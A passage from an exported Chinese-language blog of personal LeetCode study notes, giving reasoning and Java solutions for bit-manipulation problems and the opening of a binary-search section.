&#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="试填法"><a href="#试填法" class="headerlink" title="试填法"></a>试填法</h2><h2 id="恒等式"><a href="#恒等式" class="headerlink" title="恒等式"></a>恒等式</h2><h3 id="1835-所有数对按位与结果的异或和-力扣（LeetCode）"><a href="#1835-所有数对按位与结果的异或和-力扣（LeetCode）" class="headerlink" title="1835. 所有数对按位与结果的异或和 - 力扣（LeetCode）"></a><a href="https://leetcode.cn/problems/find-xor-sum-of-all-pairs-bitwise-and/description/">1835. 所有数对按位与结果的异或和 - 力扣（LeetCode）</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">恒等式：(a&amp;b)^(a&amp;c) == a&amp;(b^c) 。证明很简单分析a=0，a=1情况即可</span><br></pre></td></tr></table></figure>

<h2 id="思维题（贪心、脑筋急转弯等）"><a href="#思维题（贪心、脑筋急转弯等）" class="headerlink" title="思维题（贪心、脑筋急转弯等）"></a>思维题（贪心、脑筋急转弯等）</h2><h3 id="2546-执行逐位运算使字符串相等"><a href="#2546-执行逐位运算使字符串相等" class="headerlink" title="2546. 执行逐位运算使字符串相等"></a><a href="https://leetcode.cn/problems/apply-bitwise-operations-to-make-strings-equal/">2546. 执行逐位运算使字符串相等</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">四种情况，看看会发生什么</span><br><span class="line">00 -&gt; 00</span><br><span class="line">01 -&gt; 11</span><br><span class="line">10 -&gt; 11</span><br><span class="line">11 -&gt; 10</span><br><span class="line"></span><br><span class="line">然后查找变换路径 </span><br><span class="line">00 -&gt;00</span><br><span class="line">01 -&gt; 11 -&gt; 10 -&gt; 11 （而且不用考虑01这种前后顺序随时变）</span><br><span class="line">意思也就是如果有1，就可以任意转变为有1的任意其他数。</span><br><span class="line">判断是否都有1即可</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">makeStringsEqual</span><span class="params">(String s, String target)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> s.contains(<span class="string">&quot;1&quot;</span>) == target.contains(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="1558-得到目标数组的最少函数调用次数"><a href="#1558-得到目标数组的最少函数调用次数" class="headerlink" title="1558. 得到目标数组的最少函数调用次数"></a><a href="https://leetcode.cn/problems/minimum-numbers-of-function-calls-to-make-target-array/">1558. 得到目标数组的最少函数调用次数</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">思路贪心。但是题解并没有证明正确性，不证一下不放心。这里证明一下：</span><br><span class="line">不妨设数字需要进行</span><br><span class="line">k1,k2,.......,kn次乘二操作。设kmax为其中的最大值。因为这是公共操作，自己为0是才不会有影响，所以需要苟到刚好满足自己次数时才变成1，后面加入公共操作刚好满足自己次数。在之后的过程中需要加一随时加一即可，这里证明了改算法的正确性。</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">minOperations</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> nums.length;</span><br><span class="line">        <span class="type">int</span> <span class="variable">op1Count</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">op2Count</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">maxVal</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> num : nums) &#123;</span><br><span class="line">            maxVal = Integer.max(maxVal, num);</span><br><span class="line">            <span class="keyword">while</span> (num &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                op1Count++;</span><br><span class="line">                num &amp;= (num - <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(maxVal != <span class="number">0</span> )&#123;</span><br><span class="line">            op2Count--;</span><br><span class="line">            <span class="keyword">while</span> (maxVal &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                op2Count ++;</span><br><span class="line">                maxVal &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> op1Count + op2Count;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2571-将整数减少到零需要的最少操作数"><a href="#2571-将整数减少到零需要的最少操作数" class="headerlink" title="2571. 将整数减少到零需要的最少操作数"></a><a href="https://leetcode.cn/problems/minimum-operations-to-reduce-an-integer-to-0/">2571. 将整数减少到零需要的最少操作数</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">二进制问题。变成01串看比较简单</span><br><span class="line">假设某个数为101011101 某个地方为0肯定没必要动。某个地方为1，有两种方法一种是减去，一种是加法使得连续的1变成0，但最后最加个1，但是这个加一后可能加的一是其它连续1后面新加的末尾，因此需要走一步看一步。模拟即可</span><br><span class="line">然后带入示例，看看这样想法是不是：</span><br><span class="line">39是100111 连续三个一需要两步，最后一个单独1一步</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">minOperations</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">base</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (n &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> ((n &amp; base) != <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">while</span> ((n &amp; (base &lt;&lt; count)) != <span class="number">0</span>) &#123;</span><br><span class="line">                    count++;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//这里的count指的连续1的个数</span></span><br><span class="line">                <span class="keyword">if</span>(count == <span class="number">1</span>) n -= base;</span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    n += base;</span><br><span class="line">                &#125;</span><br><span class="line">                res++;</span><br><span class="line">                base &lt;&lt;= count;</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                base &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2568-最小无法得到的或值"><a href="#2568-最小无法得到的或值" class="headerlink" title="2568. 最小无法得到的或值"></a><a href="https://leetcode.cn/problems/minimum-impossible-or/">2568. 最小无法得到的或值</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">或会增加值。题目的意思随便找子序列或就行。（为啥给出样例数字递减啊，但没明确说啊）</span><br><span class="line"></span><br><span class="line">朴素思路，先排序再说。然后用个桶然后使用之前的写法把或出来的结果放在桶里。好像又不用排序了，就不排序。</span><br><span class="line">偷偷看了下题解发现有更简单的方法。。。。。。</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">minImpossibleOR</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        Set&lt;Integer&gt; set = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> num : nums) &#123;</span><br><span class="line">            set.add(num);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; ; i &lt;&lt;= <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!set.contains(i)) <span class="keyword">return</span> i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><h3 id="2965-找出缺失和重复的数字"><a href="#2965-找出缺失和重复的数字" class="headerlink" title="2965. 找出缺失和重复的数字"></a><a href="https://leetcode.cn/problems/find-missing-and-repeated-values/">2965. 找出缺失和重复的数字</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">这题范围很小可以之间暴力，但还是从位运算角度思考思考。</span><br><span class="line"></span><br><span class="line">这题跟260. 只出现一次的数字 III 很像。</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="title function_">getXorSum</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (n % <span class="number">4</span> == <span class="number">0</span>) <span class="keyword">return</span> n;</span><br><span class="line">        <span class="keyword">if</span> (n % <span class="number">4</span> == <span class="number">1</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (n % <span class="number">4</span> == <span class="number">2</span>) <span class="keyword">return</span> n + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] findMissingAndRepeatedValues(<span class="type">int</span>[][] grid) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> grid.length;</span><br><span class="line">        <span class="type">int</span> <span class="variable">xorSum</span> <span class="operator">=</span> getXorSum(n * n);</span><br><span class="line">        <span class="type">int</span> <span class="variable">squareXorsum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">                squareXorsum ^= grid[i][j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">c</span> <span class="operator">=</span> xorSum ^ squareXorsum;</span><br><span class="line">        <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">b</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">lowBitOfC</span> <span class="operator">=</span> c - (c &amp; (c - <span class="number">1</span>));</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt;= n * n; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> ((i &amp; lowBitOfC) != <span class="number">0</span>) a ^= i;</span><br><span class="line">            <span class="keyword">else</span> b ^= i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> ((grid[i][j] &amp; lowBitOfC) != <span class="number">0</span>) a ^= grid[i][j];</span><br><span class="line">                <span class="keyword">else</span> b ^= grid[i][j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (grid[i][j] == a) <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;a, b&#125;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;b, a&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="645-错误的集合"><a href="#645-错误的集合" class="headerlink" title="645. 错误的集合"></a><a href="https://leetcode.cn/problems/set-mismatch/">645. 错误的集合</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">跟 2965. 找出缺失和重复的数字 特别像。直接copy代码了</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] findErrorNums(<span class="type">int</span>[] nums) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> nums.length;</span><br><span class="line">        <span class="type">int</span> <span class="variable">xorSum</span> <span class="operator">=</span> getXorSum(n);</span><br><span class="line">        <span class="type">int</span> <span class="variable">squareXorsum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">           squareXorsum ^= nums[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">c</span> <span class="operator">=</span> xorSum ^ squareXorsum;</span><br><span class="line">        <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">b</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">lowBitOfC</span> <span class="operator">=</span> c - (c &amp; (c - <span class="number">1</span>));</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> ((i &amp; lowBitOfC) != <span class="number">0</span>) a ^= i;</span><br><span class="line">            <span class="keyword">else</span> b ^= i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> ((nums[i] &amp; lowBitOfC) != <span class="number">0</span>) a ^= nums[i];</span><br><span class="line">            <span class="keyword">else</span> b ^= nums[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (nums[i] == a) <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;a, b&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;b, a&#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> <span class="title function_">getXorSum</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (n % <span class="number">4</span> == <span class="number">0</span>) <span class="keyword">return</span> n;</span><br><span class="line">        <span class="keyword">if</span> (n % <span class="number">4</span> == <span class="number">1</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (n % <span class="number">4</span> == <span class="number">2</span>) <span class="keyword">return</span> n + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2154-将找到的值乘以-2"><a href="#2154-将找到的值乘以-2" class="headerlink" title="2154. 将找到的值乘以 2"></a><a href="https://leetcode.cn/problems/keep-multiplying-found-values-by-two/">2154. 将找到的值乘以 2</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">md感觉能直接用hashset啊。真想不出简洁方法了。。。。。。</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">findFinalValue</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> original)</span> &#123;</span><br><span class="line">        Set&lt;Integer&gt; set = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> num : nums) &#123;</span><br><span class="line">            set.add(num);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (set.contains(original))&#123;</span><br><span class="line">            original &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> original;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>还有更优美的位运算方法：<a href="https://leetcode.cn/problems/keep-multiplying-found-values-by-two/solutions/1239409/ha-xi-biao-mo-ni-by-endlesscheng-ipk3/">2154. 将找到的值乘以 2 - 力扣（LeetCode）</a></p>
<h3 id="2044-统计按位或能得到最大值的子集数目"><a href="#2044-统计按位或能得到最大值的子集数目" class="headerlink" title="2044. 统计按位或能得到最大值的子集数目"></a><a href="https://leetcode.cn/problems/count-number-of-maximum-bitwise-or-subsets/">2044. 统计按位或能得到最大值的子集数目</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">或只能越来越大，先数组所有值或一下，然后得到最大值orMax;</span><br><span class="line">然后想一下暴力做法，一个数可能取可能不取。然后或以下最后结果看是不是orMax如果是结果加一不是直接跳过。 2^16种情况，感觉能通过。</span><br><span class="line">顺便想想有没有能减枝的地方，我们可以预先处理出对应位为1的个数，在剩下的选项中如果orMax对应位为1，并且当前或该位为0，但是已经没有可选项，直接删除该枝干</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">int</span> <span class="variable">BIT_COUNT</span> <span class="operator">=</span> <span class="number">16</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">countMaxOrSubsets</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> nums.length;</span><br><span class="line">        <span class="type">int</span>[] record = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">16</span>];</span><br><span class="line">        <span class="type">int</span> <span class="variable">orMax</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> num : nums) &#123;</span><br><span class="line">            orMax |= num;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; BIT_COUNT; i++) &#123;</span><br><span class="line">                <span class="keyword">if</span> ((num &amp; (<span class="number">1</span> &lt;&lt; i)) != <span class="number">0</span>) record[i]++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        dfs(nums, <span class="number">0</span>, <span class="number">0</span>, n, orMax, record);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">dfs</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> curOrSum, <span class="type">int</span> i, <span class="type">int</span> n, <span class="type">int</span> target, <span class="type">int</span>[] record)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (i == n) &#123;</span><br><span class="line">            <span class="keyword">if</span> (curOrSum == target) res++;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (curOrSum == target) &#123;</span><br><span class="line">            res += (<span class="number">1</span> &lt;&lt; (n - i));</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">k</span> <span class="operator">=</span> <span class="number">0</span>; k &lt; BIT_COUNT; k++) &#123;</span><br><span class="line">            <span class="keyword">if</span> ((target &amp; (<span class="number">1</span> &lt;&lt; k)) != <span class="number">0</span> &amp;&amp; (curOrSum &amp; (<span class="number">1</span> &lt;&lt; k)) == <span class="number">0</span> &amp;&amp; record[k] == <span class="number">0</span>) <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">k</span> <span class="operator">=</span> <span class="number">0</span>; k &lt; BIT_COUNT; k++) &#123;</span><br><span class="line">            <span class="keyword">if</span> ((nums[i] &amp; (<span class="number">1</span> &lt;&lt; k)) != <span class="number">0</span>) record[k]--;</span><br><span class="line">        &#125;</span><br><span class="line">        dfs(nums, curOrSum | nums[i], i + <span class="number">1</span>, n, target, record);</span><br><span class="line">        dfs(nums, curOrSum, i + <span class="number">1</span>, n, target, record);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">k</span> <span class="operator">=</span> <span class="number">0</span>; k &lt; BIT_COUNT; k++) &#123;</span><br><span class="line">            <span class="keyword">if</span> ((nums[i] &amp; (<span class="number">1</span> &lt;&lt; k)) != <span class="number">0</span>) record[k]++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>coding</tag>
        <tag>leetcode</tag>
      </tags>
  </entry>
  <entry>
    <title>leetcode_二分查找</title>
    <url>/2024/08/07/leetcode-%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE/</url>
    <content><![CDATA[<p><a href="https://leetcode.cn/circle/discuss/SqopEo/">分享丨【题单】二分算法（二分答案&#x2F;最小化最大值&#x2F;最大化最小值&#x2F;第K小） - 力扣（LeetCode）</a></p>
<p><strong>二分的应用场景不一定有序，只要具备排他性、两段性，就可以二分</strong></p>
<p><strong>一个及格的「二分范围」只需要确保答案落在范围即可，边界可以精确计算也可以粗略估算。由于二分查找本身具有“折半”效率，因此两者不会有太大效率差距</strong></p>
<span id="more"></span>

<p>[toc]</p>
<h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><h3 id="二分查找套路总结"><a href="#二分查找套路总结" class="headerlink" title="二分查找套路总结"></a>二分查找套路总结</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int lower_bound(int[] nums, int num) &#123;</span><br><span class="line">        int left = 0;</span><br><span class="line">        int right = nums.length - 1;</span><br><span class="line">        while (left &lt; right) &#123;</span><br><span class="line">            int mid = (left + right) / 2;//left &lt;=mid &lt; right</span><br><span class="line">            if (nums[mid] &gt;= num) &#123;</span><br><span class="line">                right = mid;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                left = mid + 1;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        if(!nums[left] &gt;= num)return left + 1;</span><br><span class="line">        return left;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>二分查找我比较喜欢写闭区间，感觉这样好控制。二分查找需要注意的一个地方是变化，即每次缩小区间区间都应该有变换，否则可能会死循环。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int mid = (left + right) / 2;//left&lt;=mid&lt;right</span><br><span class="line">int mid = (left + right + 1) / 2;//left&lt;mid&lt;=right</span><br></pre></td></tr></table></figure>

<p>根据自己的变化式子可以变换mid是怎么得来的来保证区间每次都有变换</p>
<h3 id="lower-bound代码的思考"><a href="#lower-bound代码的思考" class="headerlink" title="lower_bound代码的思考"></a>lower_bound代码的思考</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//闭区间写法   </span></span><br><span class="line"><span class="type">int</span> <span class="title function_">lower_bound</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> num)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> nums.length - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (left &lt; right) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> (left + right) / <span class="number">2</span>;<span class="comment">//left &lt;=mid &lt; right</span></span><br><span class="line">            <span class="keyword">if</span> (nums[mid] &gt;= num) &#123;</span><br><span class="line">                right = mid;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                left = mid + <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    	<span class="keyword">if</span>(!nums[left] &gt;= num)<span class="keyword">return</span> left + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">return</span> left;</span><br><span class="line">    &#125;</span><br><span class="line">查找第一个大于等于num的数所在位置，如果num小于等于nums[]最小值那肯定是<span class="number">0</span>，否则为n。但是我们注意到如果最后不加特判为n- <span class="number">1</span>。所以需要特判一下</span><br></pre></td></tr></table></figure>



<h2 id="二分查找"><a href="#二分查找" class="headerlink" title="二分查找"></a>二分查找</h2><h3 id="2529-正整数和负整数的最大计数"><a href="#2529-正整数和负整数的最大计数" class="headerlink" title="2529. 正整数和负整数的最大计数"></a><a href="https://leetcode.cn/problems/maximum-count-of-positive-integer-and-negative-integer/">2529. 正整数和负整数的最大计数</a></h3><p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">maximumCount</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">neg</span> <span class="operator">=</span> lower_bound(nums, <span class="number">0</span>);</span><br><span class="line">        <span class="type">int</span> <span class="variable">pos</span> <span class="operator">=</span> nums.length - lower_bound(nums, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> Integer.max(neg, pos);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> <span class="title function_">lower_bound</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> num)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> nums.length - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (left &lt; right) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> (left + right) / <span class="number">2</span>;<span class="comment">//left &lt;=mid &lt; right</span></span><br><span class="line">            <span class="keyword">if</span> (nums[mid] &gt;= num) &#123;</span><br><span class="line">                right = mid;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                left = mid + <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(nums[left] &lt; num) <span class="keyword">return</span> nums.length;</span><br><span class="line">        <span class="keyword">return</span> left;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="1385-两个数组间的距离值"><a href="#1385-两个数组间的距离值" class="headerlink" title="1385. 两个数组间的距离值"></a><a href="https://leetcode.cn/problems/find-the-distance-value-between-two-arrays/">1385. 两个数组间的距离值</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">数据范围可以直接暴力n^2，不过还是排序加2分吧nlogn</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>代码</p>
